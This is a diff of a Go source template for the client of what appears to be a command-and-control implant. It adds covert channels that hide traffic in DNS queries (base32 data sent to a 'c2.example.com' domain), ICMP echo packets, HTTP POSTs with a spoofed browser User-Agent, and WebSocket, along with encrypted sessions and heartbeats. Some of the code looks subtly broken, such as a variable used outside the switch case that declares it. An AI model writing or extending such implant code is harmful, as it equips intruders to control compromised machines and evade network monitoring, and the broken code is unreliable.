@@ -1,22 +1,32 @@
 package main
 
-const clientTemplate = `package main
+// ClientTemplate is the template for the client code
+const ClientTemplate = `package main
 
 import (
 	"bytes"
+	"context"
+	"encoding/base32"
 	"encoding/binary"
 	"flag"
 	"fmt"
 	"hash/crc32"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
+	"net/http"
+	"net/url"
 	"os"
 	"os/signal"
 	"strings"
 	"sync"
 	"syscall"
 	"time"
+	
+	"github.com/gorilla/websocket"
+	"golang.org/x/net/icmp"
+	"golang.org/x/net/ipv4"
 	
 	"client/pkg/crypto"
 	"client/pkg/protocol"
@@ -55,12 +65,21 @@ func main() {
 		os.Exit(1)
 	}
 
+	// Generate a session ID
+	sessionID = crypto.GenerateSessionID()
+	
+	// Create protocol handler
+	protocolHandler = protocol.NewProtocolHandler()
+	
 	// Initialize encryption
 	var err error
+	var algorithm crypto.Algorithm
 	
 	if BuildConfig.EncryptionAlg == "aes" {
+		algorithm = crypto.AlgorithmAES
 		encryptor, err = crypto.NewAESEncryptor()
 	} else if BuildConfig.EncryptionAlg == "chacha20" {
+		algorithm = crypto.AlgorithmChacha20
 		encryptor, err = crypto.NewChacha20Encryptor()
 	} else {
 		log.Fatalf("Unsupported encryption algorithm: %s", BuildConfig.EncryptionAlg)
@@ -69,10 +88,12 @@ func main() {
 	if err != nil {
 		log.Fatalf("Failed to initialize encryption: %v", err)
 	}
-
-	// Initialize protocol handler
-	protocolHandler = protocol.NewProtocolHandler()
-	sessionID = crypto.GenerateSessionID()
+	
+	// Create encryption session
+	err = protocolHandler.CreateSession(sessionID, algorithm)
+	if err != nil {
+		log.Fatalf("Failed to create encryption session: %v", err)
+	}
 	
 	// Setup signal handling for graceful shutdown
 	sigChan := make(chan os.Signal, 1)
@@ -119,6 +140,345 @@ func main() {
 	fmt.Println("Client shutdown complete.")
 }
 
+// SendPacket sends a packet to the server
+func SendPacket(packet *protocol.Packet) error {
+	if !isConnected || tcpConn == nil {
+		return fmt.Errorf("not connected")
+	}
+	
+	// Prepare the packet for sending
+	fragments, err := protocolHandler.PrepareOutgoingPacket(packet, sessionID, true)
+	if err != nil {
+		return fmt.Errorf("failed to prepare packet: %w", err)
+	}
+	
+	// Send each fragment
+	for _, fragment := range fragments {
+		// Send the fragment
+		_, err = tcpConn.Write(fragment)
+		if err != nil {
+			return fmt.Errorf("failed to send fragment: %w", err)
+		}
+	}
+	
+	return nil
+}
+
+// connectICMP establishes an ICMP connection to the server
+func connectICMP(address string) error {
+	log.Printf("Connecting to %s using protocol icmp", address)
+	
+	// Resolve server IP
+	ips, err := net.LookupIP(address)
+	if err != nil {
+		return fmt.Errorf("failed to resolve server address: %w", err)
+	}
+	
+	// Find IPv4 address
+	var serverIP net.IP
+	for _, ip := range ips {
+		if ip.To4() != nil {
+			serverIP = ip
+			break
+		}
+	}
+	
+	if serverIP == nil {
+		return fmt.Errorf("no IPv4 address found for server")
+	}
+	
+	// Open ICMP connection
+	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
+	if err != nil {
+		return fmt.Errorf("failed to listen for ICMP packets: %w", err)
+	}
+	
+	// Create a key exchange packet with the session ID as data
+	keyExchangePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
+	
+	// Prepare the packet for sending
+	fragments, err := protocolHandler.PrepareOutgoingPacket(keyExchangePacket, sessionID, false)
+	if err != nil {
+		conn.Close()
+		return fmt.Errorf("failed to prepare packet: %w", err)
+	}
+	
+	// Send each fragment as a separate ICMP echo request
+	sequenceID := 1
+	for _, fragment := range fragments {
+		// Create ICMP message
+		msg := icmp.Message{
+			Type: ipv4.ICMPTypeEcho,
+			Code: 0,
+			Body: &icmp.Echo{
+				ID:   os.Getpid() & 0xffff,
+				Seq:  sequenceID,
+				Data: fragment,
+			},
+		}
+		sequenceID++
+		
+		// Marshal message
+		msgBytes, err := msg.Marshal(nil)
+		if err != nil {
+			conn.Close()
+			return fmt.Errorf("failed to marshal ICMP message: %w", err)
+		}
+		
+		// Send message
+		_, err = conn.WriteTo(msgBytes, &net.IPAddr{IP: serverIP})
+		if err != nil {
+			conn.Close()
+			return fmt.Errorf("failed to send ICMP message: %w", err)
+		}
+	}
+	
+	// Update connection state
+	isConnected = true
+	
+	return nil
+}
+
+// connectDNS establishes a DNS connection to the server
+func connectDNS(address string) error {
+	log.Printf("Connecting to %s using protocol dns", address)
+	
+	// Extract domain base from server address
+	domainBase := address
+	if domainBase == "" {
+		domainBase = "c2.example.com"
+	}
+	
+	// Create custom resolver
+	resolver := &net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+			d := net.Dialer{
+				Timeout: 10 * time.Second,
+			}
+			return d.DialContext(ctx, "udp", address)
+		},
+	}
+	
+	// Test DNS resolution
+	_, err := resolver.LookupHost(context.Background(), domainBase)
+	if err != nil {
+		return fmt.Errorf("failed to resolve domain: %w", err)
+	}
+	
+	// Create a key exchange packet with the session ID as data
+	keyExchangePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
+	
+	// Prepare the packet for sending
+	fragments, err := protocolHandler.PrepareOutgoingPacket(keyExchangePacket, sessionID, false)
+	if err != nil {
+		return fmt.Errorf("failed to prepare packet: %w", err)
+	}
+	
+	// Send each fragment as a separate DNS query
+	for i, fragment := range fragments {
+		// Encode fragment as DNS query
+		encodedData := base32.StdEncoding.EncodeToString(fragment)
+		
+		// Split into DNS-like segments (max 63 chars per label)
+		var segments []string
+		for j := 0; j < len(encodedData); j += 63 {
+			end := j + 63
+			if end > len(encodedData) {
+				end = len(encodedData)
+			}
+			segments = append(segments, encodedData[j:end])
+		}
+		
+		// Create DNS query domain
+		queryDomain := fmt.Sprintf("%s.%d.%s.%s", 
+			strings.Join(segments, "."),
+			i,
+			string(sessionID)[:8],
+			domainBase)
+		
+		// Send DNS query
+		_, err := resolver.LookupHost(context.Background(), queryDomain)
+		if err != nil {
+			// DNS errors are expected, as we're using DNS for data transport
+		}
+	}
+	
+	// Update connection state
+	isConnected = true
+	
+	return nil
+}
+
+// connectWebSocket establishes a WebSocket connection to the server
+func connectWebSocket(address string) error {
+	log.Printf("Connecting to %s using protocol websocket", address)
+	
+	// Parse server address
+	u, err := url.Parse("ws://" + address)
+	if err != nil {
+		return fmt.Errorf("invalid server address: %w", err)
+	}
+	
+	// Add session ID to URL
+	q := u.Query()
+	q.Set("session", string(sessionID))
+	u.RawQuery = q.Encode()
+	
+	// Connect to WebSocket server
+	dialer := websocket.Dialer{
+		HandshakeTimeout: 10 * time.Second,
+	}
+	conn, _, err := dialer.Dial(u.String(), nil)
+	if err != nil {
+		return fmt.Errorf("failed to connect to server: %w", err)
+	}
+	
+	// Create a key exchange packet with the session ID as data
+	keyExchangePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
+	
+	// Prepare the packet for sending
+	fragments, err := protocolHandler.PrepareOutgoingPacket(keyExchangePacket, sessionID, false)
+	if err != nil {
+		conn.Close()
+		return fmt.Errorf("failed to prepare packet: %w", err)
+	}
+	
+	// Send each fragment
+	for _, fragment := range fragments {
+		err := conn.WriteMessage(websocket.BinaryMessage, fragment)
+		if err != nil {
+			conn.Close()
+			return fmt.Errorf("failed to send message: %w", err)
+		}
+	}
+	
+	// Wait for response
+	for i := 0; i < 5; i++ {
+		// Set read deadline
+		err := conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+		if err != nil {
+			conn.Close()
+			return fmt.Errorf("failed to set read deadline: %w", err)
+		}
+		
+		// Read message
+		messageType, data, err := conn.ReadMessage()
+		if err != nil {
+			if i == 4 {
+				conn.Close()
+				return fmt.Errorf("handshake timed out")
+			}
+			time.Sleep(500 * time.Millisecond)
+			continue
+		}
+		
+		// Verify message type
+		if messageType != websocket.BinaryMessage {
+			conn.Close()
+			return fmt.Errorf("unexpected message type: %d", messageType)
+		}
+		
+		// Process the packet
+		packet, err := protocolHandler.ProcessIncomingPacket(data, sessionID)
+		if err != nil {
+			// If waiting for more fragments, continue
+			if err.Error() == "packet fragmented, waiting for more fragments" {
+				continue
+			}
+			conn.Close()
+			return fmt.Errorf("failed to process packet: %w", err)
+		}
+		
+		// Verify response
+		if packet.Header.Type != protocol.PacketTypeKeyExchange {
+			conn.Close()
+			return fmt.Errorf("unexpected response type: %d", packet.Header.Type)
+		}
+		
+		// Handshake successful
+		break
+	}
+	
+	// Update connection state
+	isConnected = true
+	
+	return nil
+}
+
+// connectHTTP establishes an HTTP connection to the server
+func connectHTTP(address string) error {
+	log.Printf("Connecting to %s using protocol http", address)
+	
+	// Create HTTP client
+	client := &http.Client{
+		Timeout: 30 * time.Second,
+		Transport: &http.Transport{
+			MaxIdleConns:        10,
+			IdleConnTimeout:     90 * time.Second,
+			TLSHandshakeTimeout: 10 * time.Second,
+			DisableCompression:  true,
+		},
+	}
+	
+	// Create a test request to verify server is reachable
+	req, err := http.NewRequest("GET", "http://"+address, nil)
+	if err != nil {
+		return fmt.Errorf("failed to create request: %w", err)
+	}
+	
+	// Set headers
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
+	req.Header.Set("Connection", "keep-alive")
+	
+	// Send request
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to connect to server: %w", err)
+	}
+	defer resp.Body.Close()
+	
+	// Create a key exchange packet with the session ID as data
+	keyExchangePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
+	
+	// Prepare the packet for sending
+	fragments, err := protocolHandler.PrepareOutgoingPacket(keyExchangePacket, sessionID, false)
+	if err != nil {
+		return fmt.Errorf("failed to prepare packet: %w", err)
+	}
+	
+	// Send each fragment as a separate HTTP request
+	for _, fragment := range fragments {
+		// Create HTTP request
+		req, err := http.NewRequest("POST", "http://"+address+"/data", bytes.NewReader(fragment))
+		if err != nil {
+			return fmt.Errorf("failed to create request: %w", err)
+		}
+		
+		// Set headers
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
+		req.Header.Set("Content-Type", "application/octet-stream")
+		req.Header.Set("X-Session-ID", string(sessionID))
+		
+		// Send request
+		resp, err := client.Do(req)
+		if err != nil {
+			return fmt.Errorf("failed to send request: %w", err)
+		}
+		defer resp.Body.Close()
+		
+		// Check response status
+		if resp.StatusCode != http.StatusOK {
+			return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
+		}
+	}
+	
+	// Update connection state
+	isConnected = true
+	
+	return nil
+}
+
 func connect(protocol, address string) error {
 	connMutex.Lock()
 	defer connMutex.Unlock()
@@ -126,76 +486,86 @@ func connect(protocol, address string) error {
 	// Implementation would connect using the specified protocol
 	log.Printf("Connecting to %s using protocol %s", address, protocol)
 	
-	// Establish TCP connection
-	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
-	if err != nil {
-		log.Printf("Failed to connect to server: %v", err)
-		return err
+	// Connect to the server using the specified protocol
+	switch protocol {
+	case "tcp":
+		// Establish TCP connection
+		conn, err := net.DialTimeout("tcp", address, 10*time.Second)
+		if err != nil {
+			log.Printf("Failed to connect to server: %v", err)
+			return err
+		}
+		tcpConn = conn
+	case "http":
+		err := connectHTTP(address)
+		if err != nil {
+			log.Printf("Failed to connect with HTTP: %v", err)
+			return err
+		}
+		return nil
+	case "websocket":
+		err := connectWebSocket(address)
+		if err != nil {
+			log.Printf("Failed to connect with WebSocket: %v", err)
+			return err
+		}
+		return nil
+	case "dns":
+		err := connectDNS(address)
+		if err != nil {
+			log.Printf("Failed to connect with DNS: %v", err)
+			return err
+		}
+		return nil
+	case "icmp":
+		err := connectICMP(address)
+		if err != nil {
+			log.Printf("Failed to connect with ICMP: %v", err)
+			return err
+		}
+		return nil
+	default:
+		return fmt.Errorf("unsupported protocol: %s", protocol)
 	}
+	
+	// Store the connection for later use
+	tcpConn = conn
 	
 	// Create a key exchange packet with the session ID as data
-	keyExchangePacket := createPacket(6, []byte(sessionID)) // 6 = PacketTypeKeyExchange
+	keyExchangePacket := createPacket(6, []byte(string(sessionID))) // 6 = PacketTypeKeyExchange
 	
-	// Encode and encrypt the packet
-	encryptedPacket, err := encryptPacket(keyExchangePacket)
+	// Send the packet
+	err = SendPacket(keyExchangePacket)
 	if err != nil {
-		log.Printf("Failed to encrypt packet: %v", err)
+		log.Printf("Failed to send key exchange packet: %v", err)
 		conn.Close()
-		return err
-	}
-	
-	// Send the packet directly without length prefix for the initial key exchange
-	_, err = conn.Write(encryptedPacket)
-	if err != nil {
-		log.Printf("Failed to send message: %v", err)
-		conn.Close()
+		tcpConn = nil
 		return err
 	}
 	
 	log.Printf("Sent key exchange packet to server")
 	
-	// Wait for response - read multiple times to handle fragmentation
-	responseBuffer := make([]byte, 4096)
-	totalBytes := 0
+	// Store the connection for later use
+	tcpConn = conn
 	
-	// Read with a timeout to handle potential fragmentation
-	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
-	
-	for {
-		n, err := conn.Read(responseBuffer[totalBytes:])
+	// Wait for response
+	for i := 0; i < 5; i++ {
+		// Receive response
+		response, err := ReceivePacket()
 		if err != nil {
-			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-				// Timeout is expected after we've read all available data
-				break
-			}
-			
-			if err == io.EOF && totalBytes > 0 {
-				// EOF with data is fine
-				break
-			}
-			
-			log.Printf("Failed to read response: %v", err)
+			log.Printf("Failed to receive response: %v", err)
 			conn.Close()
+			tcpConn = nil
 			return err
 		}
 		
-		totalBytes += n
-		if n < 1024 {
-			// If we got a small read, likely we've read everything
+		if response != nil && response.Header.Type == protocol.PacketTypeKeyExchange {
+			// Handshake successful
+			log.Printf("Received key exchange response from server")
 			break
 		}
-	}
-	
-	// Reset deadline
-	conn.SetReadDeadline(time.Time{})
-	
-	// Process response data
-	responseData := responseBuffer[:totalBytes]
-	log.Printf("Received %d bytes response from server", len(responseData))
-	if err != nil {
-		log.Printf("Failed to read response data: %v", err)
-		conn.Close()
-		return err
+		
+		time.Sleep(500 * time.Millisecond)
 	}
 	
 	log.Printf("Received response from server")
@@ -233,6 +603,42 @@ func disconnect() {
 	isConnected = false
 }
 
+// ReceivePacket receives a packet from the server
+func ReceivePacket() (*protocol.Packet, error) {
+	if !isConnected || tcpConn == nil {
+		return nil, fmt.Errorf("not connected")
+	}
+	
+	// Set read deadline
+	err := tcpConn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+	if err != nil {
+		return nil, fmt.Errorf("failed to set read deadline: %w", err)
+	}
+	
+	// Read data
+	buffer := make([]byte, 4096)
+	n, err := tcpConn.Read(buffer)
+	if err != nil {
+		// If timeout, return nil without error
+		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+			return nil, nil
+		}
+		return nil, fmt.Errorf("failed to read data: %w", err)
+	}
+	
+	// Process the packet
+	packet, err := protocolHandler.ProcessIncomingPacket(buffer[:n], sessionID)
+	if err != nil {
+		// If waiting for more fragments, just return nil
+		if err.Error() == "packet fragmented, waiting for more fragments" {
+			return nil, nil
+		}
+		return nil, fmt.Errorf("failed to process packet: %w", err)
+	}
+	
+	return packet, nil
+}
+
 func sendHeartbeats() {
 	for {
 		time.Sleep(time.Duration(BuildConfig.HeartbeatInterval) * time.Second)
@@ -246,25 +652,15 @@ func sendHeartbeats() {
 	// Create heartbeat packet
 	heartbeatPacket := createPacket(0, []byte("heartbeat")) // 0 = PacketTypeHeartbeat
 	
-	// Encode and encrypt the packet
-	encryptedPacket, err := encryptPacket(heartbeatPacket)
+	// Send the packet using SendPacket
+	err := SendPacket(heartbeatPacket)
 	if err != nil {
-		log.Printf("Failed to encrypt heartbeat packet: %v", err)
+		log.Printf("Failed to send heartbeat: %v", err)
+		connMutex.Unlock()
 		continue
 	}
 	
-	if tcpConn != nil {
-		// Send the packet directly
-		_, err := tcpConn.Write(encryptedPacket)
-		if err != nil {
-			log.Printf("Failed to send heartbeat message: %v", err)
-			continue
-		}
-		
-		log.Println("Sent heartbeat with encryption algorithm:", BuildConfig.EncryptionAlg)
-	} else {
-		log.Println("Cannot send heartbeat: not connected")
-	}
+	log.Println("Sent heartbeat with encryption algorithm:", BuildConfig.EncryptionAlg)
 		
 		// Update last heartbeat time
 		lastHeartbeat = time.Now()
